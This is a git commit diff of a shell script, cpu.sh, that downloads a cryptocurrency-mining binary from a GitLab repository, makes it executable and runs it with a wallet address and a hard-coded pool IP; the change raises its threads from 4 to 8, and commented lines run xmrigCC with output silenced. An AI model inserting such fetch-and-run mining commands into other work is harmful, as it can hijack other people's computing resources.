025ad9b9c67775de3f87e89cb7540d6c184ab260
MJVideo <majapahlevi@gmail.com>
2024-08-18 06:14:44 +0000

    Update cpu.sh

--- cpu.sh
+++ cpu.sh
@@ -5,7 +5,7 @@
 #wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p MJ -k -a randomx -t4 > /dev/null 2>&1
 
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/tnn-miner1 && chmod 777 tnn-miner1 && ./tnn-miner1 --spectre --wallet spectre:qp99w2cc8gyfwnkjkccgh9k7zjtyzhsw688zja23dnfph60t8uazxwymzuuwf --daemon-address 134.209.245.90 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --threads 4 --dev-fee 1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/tnn-miner1 && chmod 777 tnn-miner1 && ./tnn-miner1 --spectre --wallet spectre:qp99w2cc8gyfwnkjkccgh9k7zjtyzhsw688zja23dnfph60t8uazxwymzuuwf --daemon-address 134.209.245.90 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --threads 8 --dev-fee 1
 
 #wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 142.93.71.111:443 -u TuskeSyuMmk2xje2yUypZdWqLyjzRG7AjgcGk21HqjPTeztTahdSjA1SL7qokYAJxJ2NESFcGy5oQEdtNXMqjFGp5a7RE7cVrLa3LS -p WK01 -k -a rx/tuske -t4 > /dev/null 2>&1
 
